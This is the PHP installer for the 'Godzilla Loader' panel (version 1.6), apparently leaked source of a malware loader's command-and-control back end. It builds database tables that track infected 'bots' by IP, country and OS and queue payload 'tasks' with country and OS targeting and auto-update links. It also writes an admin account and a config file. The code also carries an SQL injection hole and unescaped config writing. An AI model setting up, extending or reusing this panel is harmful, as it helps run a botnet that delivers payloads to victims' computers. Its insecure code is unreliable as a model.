<?php
error_reporting(E_ALL);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
ob_start();
define('CP', TRUE);
$confFile = __DIR__.'/core/config.php';
if(is_readable($confFile))
	die("<b>".$confFile." already exists delete it first!</b>");

function createDataBase($db_host, $db_login, $db_pass, $db_base, $auth_login, $auth_pass)
{
	$mydatabase = @new mysqli($db_host, $db_login, $db_pass, $db_base);
	if (mysqli_connect_error()) {
		return('<div class="alert alert-danger col-lg-5 col-lg-offset-3"><a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a> <strong>MySQL error</strong>: ' . mysqli_connect_errno() . '</div>');
	}

	@mysqli_query($mydatabase, 'SET NAMES "utf8" COLLATE "utf8_unicode_ci";');

	$sql = "CREATE TABLE IF NOT EXISTS `bots` (
			`id` int(11) NOT NULL  AUTO_INCREMENT PRIMARY KEY,
			`botuid` varchar(15) NOT NULL UNIQUE KEY,
			`ip` int(40) unsigned NOT NULL,
			`cc` varchar(2) NOT NULL,
			`timeAdd` int(32) NOT NULL,
			`timeLast` int(32) NOT NULL,
			`os` tinyint(2) NOT NULL,
			`wow64` int(1) NOT NULL,
			`taskcomplete` varchar(256) NOT NULL
			) ENGINE=InnoDB DEFAULT CHARSET=latin1;";

	if(mysqli_query($mydatabase, $sql) == FALSE)
		return('<b> [MySQL]: Error creating table `bots`: '.mysqli_error($mydatabase)."</b>");
		
	$sql = "CREATE TABLE IF NOT EXISTS `task` (
			`id` int(11) NOT NULL  AUTO_INCREMENT PRIMARY KEY,
			`filename` varchar(255) NOT NULL,
			`filehash` varchar(1024) NOT NULL,
			`active` tinyint(1) NOT NULL,
			`country` varchar(256) NOT NULL,
			`os` varchar(64) NOT NULL,
			`days` varchar(64) NOT NULL,
			`need` smallint(32) NOT NULL,
			`complete` smallint(32) NOT NULL,
			`timeAdd` int(32) NOT NULL,
			`onlynewbots` int(1) NOT NULL,
			`autoupdate` int(1) NOT NULL,
			`updatelink` varchar(1024) NOT NULL,
			`updateinterval` int(5) NOT NULL,
			`updatelast` int(32) NOT NULL
			) ENGINE=InnoDB DEFAULT CHARSET=latin1;";
		
	if(mysqli_query($mydatabase, $sql) == FALSE)
		return('<b> [MySQL]: Error creating table `task`: '.mysqli_error($mydatabase)."</b>");
	
	$sql = "CREATE TABLE IF NOT EXISTS `users` (
			`uid` int(11) NOT NULL,
			`username` varchar(64) DEFAULT NULL,
			`password` varchar(256) DEFAULT NULL,
			`theme` tinyint(1) NOT NULL DEFAULT '1',
			`lang` varchar(2) NOT NULL DEFAULT 'ru',
			`sid` varchar(64) DEFAULT NULL
		)";
	if(mysqli_query($mydatabase, $sql) == FALSE)
		return('<b> [MySQL]: Error creating table `users`: '.mysqli_error($mydatabase)."</b>");

	$password = hash('sha256', $auth_pass);
	$sql = "INSERT INTO `users` (`uid`, `username`, `password`, `theme`, `lang`, `sid`) VALUES ('1', '{$auth_login}', '{$password}', '1', 'ru', NULL);";
	if(mysqli_query($mydatabase, $sql) == FALSE)
		return('<b> [MySQL]: Failed to add new user ('.mysqli_errno($mydatabase).'): '.mysqli_error($mydatabase)."</b>");
	return true;
}

$error = '';

if(isset($_POST['dbusername']))
{
	$dbUser = $_POST['dbusername'];
	$dbPass = isset($_POST['dbpassword']) ? $_POST['dbpassword'] : '';
	$dbHost = $_POST['dbhost'];
	$dbName = $_POST['dbname'];
	$user = $_POST['username'];
	$pass = $_POST['password'];
	
	$error .= createDataBase($dbHost, $dbUser, $dbPass, $dbName, $user, $pass);
	if($error == 1){
		$error = '';
		$f = fopen($confFile, "w+");
			if($f){
				file_put_contents($confFile, "");
				$write = "<?php\n";
				$write .= '$MYSQL_HOST = "' . $dbHost . "\";  // MySQL hostname \n";
				$write .= '$MYSQL_DB = "' . $dbName . "\";  // MySQL datebase \n";
				$write .= '$MYSQL_LOGIN = "' . $dbUser . "\";  // MySQL username \n";
				$write .= '$MYSQL_PASSWORD = "' .$dbPass . "\";  // MySQL password \n";
				$write .= "\$PANEL_SYSINSTALL = 1;  // Install to system(resident)\n";
				$write .= "\$PANEL_GUESTSTATS = \"c48c63b1661ed35b1abbb21e0fca6b9616d6e4cc\";  // Guest Statistics \n";
				$write .= "?>";
				fwrite($f, $write);
			fclose($f);
			}
	}
}

?>
<!DOCTYPE html><html><head><title>Godzilla Loader</title><style>@import url(media/css/vendor.min.css);@import url(media/css/dashboard.day.css);</style><script type=text/javascript src=media/js/vendor.min.js></script></head><body class=bg-info><div class=container><p>&nbsp;</p><div class="panel panel-success"><div class=panel-body><div class=row><form class=form-horizontal method=post><?php echo $error?><div class=col-lg-6><h3>Godzilla Loader Installer</h3><p>&nbsp;</p><div class=page-header><h5>MySQL Database</h5></div><div class=form-group><label for=dbusername class="col-lg-4 control-label">DB user</label><div class=col-lg-8><input type=text class=form-control id=dbusername name=dbusername required></div></div><div class=form-group><label for=dbpassword class="col-lg-4 control-label">DB pass</label><div class=col-lg-8><input type=text class=form-control id=dbpassword name=dbpassword></div></div><div class=form-group><label for=dbhost class="col-lg-4 control-label">DB host</label><div class=col-lg-8><input type=text class=form-control id=dbhost name=dbhost></div></div><div class=form-group><label for=dbname class="col-lg-4 control-label">DB base</label><div class=col-lg-8><input type=text class=form-control id=dbname name=dbname required></div></div></div><div class=col-lg-6><div style="margin:18% 5% 0 0"><div class=page-header><h5>Authorization</h5></div><div class=form-group><label for=username class="col-lg-4 control-label">user</label><div class=col-lg-8><input type=text class=form-control id=username name=username required></div></div><div class=form-group><label for=password class="col-lg-4 control-label">pass</label><div class=col-lg-8><input type=text class=form-control id=password name=password required></div></div></div></div></div><p>&nbsp;</p><p>&nbsp;</p><div class="col-md-2 col-md-offset-10"><button type=submit class="btn btn-primary btn-lg btn-block" value=install><b>Go <i class="fa fa-arrow-right"></i></b></button><p>&nbsp;</p></div></form></div><div class="panel-footer text-right"> &copy; Godzilla Loader <span class="small text-muted">ver. 1.6</span></div></div></div></body></html>
<?php ob_end_flush();?>